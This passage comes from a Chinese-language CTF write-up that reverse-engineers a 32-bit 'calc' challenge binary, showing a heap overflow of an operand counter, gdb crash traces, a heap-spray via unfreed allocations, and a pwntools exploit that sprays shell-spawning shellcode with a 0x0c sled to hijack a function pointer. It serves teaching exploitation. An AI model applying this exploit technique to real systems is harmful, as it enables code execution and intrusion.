+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*__ctype_b_loc())[*s1] &amp; <span class="number">0x800</span> || *s1 == <span class="string">&#x27;-&#x27;</span> &amp;&amp; <span class="built_in">strlen</span>(s1) &gt; <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( sub_804886B(s1) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = sub_804A6F8(byte_804AC65, s1);		<span class="comment">//a</span></span><br><span class="line">    sub_804A8B5(dword_804D0B4, v1);			<span class="comment">//b</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid number&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_68;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<ul>
+<li><p>a - sub_804A6F8函数</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">sub_804A6F8</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">char</span> *nptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v2; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">calloc</span>(<span class="number">0x10</span>u, <span class="number">1u</span>);</span><br><span class="line">  v2[<span class="number">2</span>] = strtol(nptr, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="string">&quot;int&quot;</span>;</span><br><span class="line">  *v2 = strdup(s);</span><br><span class="line">  v2[<span class="number">3</span>] = <span class="built_in">strlen</span>(nptr);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>可以看到，该函数中生成了如下堆块，并返回给上层调用者。</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">heap1中存放着函数的第一个参数；string1处的字符串为“int”；num是运算数的十进制表达式；最后一个块中存放运算数的长度信息。</span><br><span class="line">|------------|</span><br><span class="line">| &amp;heap1     |</span><br><span class="line">|------------|</span><br><span class="line">| &amp;string1   |</span><br><span class="line">|------------|</span><br><span class="line">| num        |</span><br><span class="line">|------------|</span><br><span class="line">| strlen(num)|</span><br><span class="line">|------------|</span><br></pre></td></tr></table></div></figure>
+
+</li>
+<li><p>b - sub_804A8B5函数</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">sub_804A8B5</span><span class="params">(_DWORD *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;		</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  ++*a1;</span><br><span class="line">  result = a1;</span><br><span class="line">  a1[*a1 + <span class="number">1</span>] = a2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>该函数的入参为：a1是dword_804D0B4（即指向0x84大小的堆块），a2是sub_804A6F8函数返回的堆块地址。函数的功能是操作0x84堆块中的内容，将堆中第一块（4字节）的内容自加1（作为计数，记录堆块中链接了多少个操作数），并从第3个块（a1[2]）处链接操作数堆块a2。</p>
+</li>
+</ul>
+<p>对运算符的处理过程跟以上对运算数的处理过程基本一致，只不过运算符是链接在dword_804D0AC指向的堆块上。</p>
+<p>由于dword_804D0B4指向的堆块先于dword_804D0AC指向堆块的申请，因此他俩在堆空间的排布如下：</p>
+<p><img src="image-20200627001525800.png"></p>
+<p>dword_804D0B4指向的堆块大小为0x84，最多可存储0x84/0x4 - 2=0x21 - 2=33 - 2 = 31个运算数信息。但是我们可以输入256个字节的字符串，因此我们可输入的运算数远远大于31，那么此时运算数信息就会溢出到存放运算符的堆块。如上图所示，第33个运算数的堆块会覆盖绿色堆块中的count，那么之后访问运算符的时候会取到一个超大的值。</p>
+
+        <h4 id="while-sub-804A8D7-dword-804D0AC"   >
+          <a href="#while-sub-804A8D7-dword-804D0AC" class="heading-link"><i class="fas fa-link"></i></a><a href="#while-sub-804A8D7-dword-804D0AC" class="headerlink" title="while ( !sub_804A8D7(dword_804D0AC) )"></a>while ( !sub_804A8D7(dword_804D0AC) )</h4>
+      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v9 = sub_804A88E(dword_804D0AC);</span><br><span class="line">(*(v9 + <span class="number">8</span>))();</span><br></pre></td></tr></table></div></figure>
+<p>先调用sub_804A88E函数，从运算符堆块中取出一个运算符，然后对该运算符取值运行。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804A88E</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a1[(*a1)-- + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>我们可以看到sub_804A88E中访问了运算符堆块的第一个count，即*a1。上面讨论了这个值可以被越界覆盖，因此在这里会越界访问，导致程序崩溃。</p>
+
+        <h2 id="1-4-poc"   >
+          <a href="#1-4-poc" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-4-poc" class="headerlink" title="1.4 poc"></a>1.4 poc</h2>
+      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python -c <span class="string">&quot;print &#x27;1 &#x27; * 33&quot;</span></span></span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line"><span class="meta">$</span><span class="bash"> gdb calc</span></span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /mnt/hgfs/VMshare/calc/calc </span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1</span> </span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x0804a89c in ?? ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">─────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="bash">eax   : 0x0804e0a8  →  0x0804f058  →  0x0804f070  →  0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">ebx   : 0x0</span>       </span><br><span class="line"><span class="meta">$</span><span class="bash">ecx   : 0x0</span>       </span><br><span class="line"><span class="meta">$</span><span class="bash">edx   : 0x0804f058  →  0x0804f070  →  0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">esp   : 0xffffcd08  →  0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">ebp   : 0xffffcd18  →  0xffffcd78  →  0xffffcea8  →  0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">esi   : 0xf7fb6000  →  0x001b1db0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">edi   : 0xf7fb6000  →  0x001b1db0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">eip   : 0x0804a89c  →   mov eax, DWORD PTR [eax+edx*4+0x4]</span></span><br><span class="line"><span class="meta">$</span><span class="bash">eflags: [carry parity adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow RESUME virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="bash">cs: 0x0023 <span class="variable">$ss</span>: 0x002b <span class="variable">$ds</span>: 0x002b <span class="variable">$es</span>: 0x002b <span class="variable">$fs</span>: 0x0000 <span class="variable">$gs</span>: 0x0063</span> </span><br><span class="line">────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffcd08│+0x0000: 0x00000000	 ← $esp</span><br><span class="line">0xffffcd0c│+0x0004: 0x00000000</span><br><span class="line">0xffffcd10│+0x0008: 0x00000000</span><br><span class="line">0xffffcd14│+0x000c: 0x00000000</span><br><span class="line">0xffffcd18│+0x0010: 0xffffcd78  →  0xffffcea8  →  0x00000000	 ← $ebp</span><br><span class="line">0xffffcd1c│+0x0014: 0x080493b6  →   add esp, 0x10</span><br><span class="line">0xffffcd20│+0x0018: 0x0804e0a8  →  0x0804f058  →  0x0804f070  →  0x00000000</span><br><span class="line">0xffffcd24│+0x001c: 0x0804ac54  →   and BYTE PTR [eax], al</span><br><span class="line">───────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x804a892                  in     al, dx</span><br><span class="line">    0x804a893                  adc    BYTE PTR [ebx+0x108b0845], cl</span><br><span class="line">    0x804a899                  mov    eax, DWORD PTR [ebp+0x8]</span><br><span class="line"> →  0x804a89c                  mov    eax, DWORD PTR [eax+edx*4+0x4]</span><br><span class="line">    0x804a8a0                  mov    DWORD PTR [ebp-0x4], eax</span><br><span class="line">    0x804a8a3                  mov    eax, DWORD PTR [ebp+0x8]</span><br><span class="line">    0x804a8a6                  mov    eax, DWORD PTR [eax]</span><br><span class="line">    0x804a8a8                  lea    edx, [eax-0x1]</span><br><span class="line">    0x804a8ab                  mov    eax, DWORD PTR [ebp+0x8]</span><br><span class="line">────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="bash">0] Id 1, Name: <span class="string">&quot;calc&quot;</span>, stopped, reason: SIGSEGV</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="bash">0] 0x804a89c → mov eax, DWORD PTR [eax+edx*4+0x4]</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">1] 0x80493b6 → add esp, 0x10</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">2] 0x8048bb9 → add esp, 0x10</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">3] 0xf7e1c637 → __libc_start_main(main=0x80488cb, argc=0x1, argv=0xffffcf54, init=0x804aba0, fini=0x804ac00, rtld_fini=0xf7fe8880 &lt;_dl_fini&gt;, stack_end=0xffffcf4c)</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">4] 0x8048791 → hlt</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  vmmap</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x0804c000 0x00000000 r-x /mnt/hgfs/VMshare/calc/calc</span><br><span class="line">0x0804c000 0x0804d000 0x00003000 r-x /mnt/hgfs/VMshare/calc/calc</span><br><span class="line">0x0804d000 0x0804e000 0x00004000 rwx /mnt/hgfs/VMshare/calc/calc</span><br><span class="line">0x0804e000 0x0806f000 0x00000000 rwx [heap]</span><br><span class="line">0xf7e03000 0xf7e04000 0x00000000 rwx </span><br><span class="line">0xf7e04000 0xf7fb4000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb4000 0xf7fb6000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb6000 0xf7fb7000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb7000 0xf7fba000 0x00000000 rwx </span><br><span class="line">0xf7fd3000 0xf7fd4000 0x00000000 rwx </span><br><span class="line">0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 0x00000000 rwx [stack]</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></div></figure>
+<p>可以看到，程序运行到<code>0x804a89c   mov    eax, DWORD PTR [eax+edx*4+0x4]</code>处时，崩溃了。<code>eax+edx*4+0x4 = 0x0804e0a8 +0x0804f058*4 + 0x4 = 0x2818a20c</code>。通过上面的vmmap信息，可以看出，0x2818a20c这个地址并未被映射，所以访问时会导致程序异常崩溃。</p>
+<p>我们要怎样利用这个异常访问呢？如果我们能将这个超大地址映射成功，并且能控制这个地址的内容，是不是就能控制执行流了呢？</p>
+<p>这个题没有开NX，因此堆栈上的数据可以执行，我们可以在堆上布局shellcode。</p>
+
+        <h1 id="2-利用"   >
+          <a href="#2-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用" class="headerlink" title="2 利用"></a>2 利用</h1>
+      
+        <h2 id="2-1-申请不释放的堆空间"   >
+          <a href="#2-1-申请不释放的堆空间" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-1-申请不释放的堆空间" class="headerlink" title="2.1 申请不释放的堆空间"></a>2.1 申请不释放的堆空间</h2>
+      <p>我们发现乘法函数sub_8049A0E中有一段申请内存的操作，但是并没有释放这些内存。因此我们可以利用该乘法函数，不断扩展堆空间，使0x2818a20c这个位置被映射。</p>
+<p>如下代码段是sub_8049A0E函数中涉及内存申请的部分。当一个字符类型和一个整形相乘时，会根据字符长度和整型值的乘积申请堆空间。<code>*(v8 + 12)</code> 是字符的长度，<code>*(v7 + 8)</code>是整型值。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(*(v8 + <span class="number">4</span>), <span class="string">&quot;str&quot;</span>) &amp;&amp; !<span class="built_in">strcmp</span>(*(v7 + <span class="number">4</span>), <span class="string">&quot;int&quot;</span>) )</span><br><span class="line"> &#123;</span><br><span class="line">   v6 = *(v7 + <span class="number">8</span>);</span><br><span class="line">   dest = <span class="built_in">calloc</span>(*(v8 + <span class="number">12</span>) * *(v7 + <span class="number">8</span>) + <span class="number">1</span>, <span class="number">1u</span>);</span><br><span class="line">   v9 = dest;</span><br></pre></td></tr></table></div></figure>
+<p>因此用如下poc测试申请堆空间，确认能否将较高地址处映射成功。</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line">myelf = ELF(<span class="string">&quot;./calc&quot;</span>)</span><br><span class="line">myproc = process(myelf.path)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&quot;a &quot; * 100000&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6000</span>):</span><br><span class="line">    myproc.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,payload)</span><br><span class="line">gdb.attach(myproc,<span class="string">&quot;b * 0x0804A89C\nc&quot;</span>)</span><br><span class="line"></span><br><span class="line">myproc.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;1 &quot;</span> * <span class="number">33</span></span><br><span class="line">myproc.sendline(payload)</span><br><span class="line"></span><br><span class="line">myproc.interactive()</span><br></pre></td></tr></table></div></figure>
+<p>执行结果如下，可见0x09779000至0x510e2000的地址空间全被映射为堆空间了，并且被我们的输入”a “给填满了。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="bash">eax   : 0x097790a8  →  0x510c22d8  →  0x510c22f0  →  0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">ebx   : 0x0</span>       </span><br><span class="line"><span class="meta">$</span><span class="bash">ecx   : 0x0</span>       </span><br><span class="line"><span class="meta">$</span><span class="bash">edx   : 0x510c22d8  →  0x510c22f0  →  0x00000000</span></span><br><span class="line"></span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x804a892                  in     al, dx</span><br><span class="line">    0x804a893                  adc    BYTE PTR [ebx+0x108b0845], cl</span><br><span class="line">    0x804a899                  mov    eax, DWORD PTR [ebp+0x8]</span><br><span class="line"> →  0x804a89c                  mov    eax, DWORD PTR [eax+edx*4+0x4]</span><br><span class="line">    0x804a8a0                  mov    DWORD PTR [ebp-0x4], eax</span><br><span class="line">    0x804a8a3                  mov    eax, DWORD PTR [ebp+0x8]</span><br><span class="line">    0x804a8a6                  mov    eax, DWORD PTR [eax]</span><br><span class="line"></span><br><span class="line">gef➤  vmmap</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x0804c000 0x00000000 r-x /mnt/hgfs/VMshare/calc/calc</span><br><span class="line">0x0804c000 0x0804d000 0x00003000 r-x /mnt/hgfs/VMshare/calc/calc</span><br><span class="line">0x0804d000 0x0804e000 0x00004000 rwx /mnt/hgfs/VMshare/calc/calc</span><br><span class="line">0x09779000 0x510e2000 0x00000000 rwx [heap]</span><br><span class="line">0xf7dad000 0xf7dae000 0x00000000 rwx </span><br><span class="line">0xf7dae000 0xf7f5e000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7f5e000 0xf7f60000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7f60000 0xf7f61000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7f61000 0xf7f64000 0x00000000 rwx </span><br><span class="line">0xf7f7d000 0xf7f7e000 0x00000000 rwx </span><br><span class="line">0xf7f7e000 0xf7f81000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7f81000 0xf7f83000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7f83000 0xf7fa6000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7fa6000 0xf7fa7000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7fa7000 0xf7fa8000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffd0000 0xffff1000 0x00000000 rwx [stack]</span><br><span class="line"></span><br><span class="line">gef➤  x/10gx 0x33333333</span><br><span class="line">0x33333333:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x33333343:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x33333353:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x33333363:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x33333373:	0x6161616161616161	0x6161616161616161</span><br></pre></td></tr></table></div></figure>
+<p>此时eax+edx*4+0x4的计算如下：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; eax = 0x097790a8</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; edx = 0x510c22d8</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; hex(eax+edx*4+0x4)</span></span><br><span class="line">&#x27;0x14da81c0c&#x27;</span><br></pre></td></tr></table></div></figure>
+<p>由于环境是32位的，所以最终计算结果为’0x4da81c0c’，这个值是sub_804A88E函数的返回值。这个返回值作为地址，偏移8字节的位置处的值，会被作为函数执行。如果我们能劫持0x4da81c0c+8=0x4da81c14地址处的值，就可以劫持控制流。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v9 = sub_804A88E((_DWORD *)G_D0AC);</span><br><span class="line">(*(<span class="keyword">void</span> (**)(<span class="keyword">void</span>))(v9 + <span class="number">8</span>))();</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="2-2-exp"   >
+          <a href="#2-2-exp" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-2-exp" class="headerlink" title="2.2 exp"></a>2.2 exp</h2>
+      <p>通过以上的分析可知，我们需要往堆空间布局一些shellcode，并且劫持<code>(*(void (**)(void))(v9 + 8))()</code>执行我们的shellcode。但是我们很难精确将shellcode布置到该地址，因此采用’\x0c’滑板指令，结合shellcode的方式完成利用。</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line">myelf = ELF(<span class="string">&quot;./calc&quot;</span>)</span><br><span class="line">myproc = process(myelf.path)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &#x27;&quot;a&quot; * 100000&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&quot;&#x27;</span> + asm(shellcraft.sh()).ljust(<span class="number">200</span>,<span class="string">&#x27;\x0c&#x27;</span>) + <span class="string">&#x27;&quot; * 500&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6000</span>):</span><br><span class="line">    myproc.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,payload)</span><br><span class="line">gdb.attach(myproc,<span class="string">&quot;b * 0x0804A89C\nc&quot;</span>)</span><br><span class="line"></span><br><span class="line">myproc.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;1 &quot;</span> * <span class="number">33</span></span><br><span class="line">myproc.sendline(payload)</span><br><span class="line"></span><br><span class="line">myproc.interactive()</span><br></pre></td></tr></table></div></figure></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2020/06/25/calc-heap/">http://blingblingxuanxuan.github.io/2020/06/25/calc-heap/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/06/30/caffe/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">caffe的安装与使用</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/05/17/overthewire-bandit/"><span class="paginator-prev__text">overthewire bandit</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">
+          1 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">
+          1.1 查看程序基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E8%BF%90%E8%A1%8C%E8%AF%95%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">
+          1.2 运行试试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-IDA%E9%80%86%E5%90%91"><span class="toc-number">1.3.</span> <span class="toc-text">
+          1.3 IDA逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#line-1-2-3"><span class="toc-number">1.3.1.</span> <span class="toc-text">
+          line 1 2 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#line-4-5-6-7"><span class="toc-number">1.3.2.</span> <span class="toc-text">
+          line 4 5 6 7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-804A83F"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">
+          sub_804A83F()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-804A946"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">
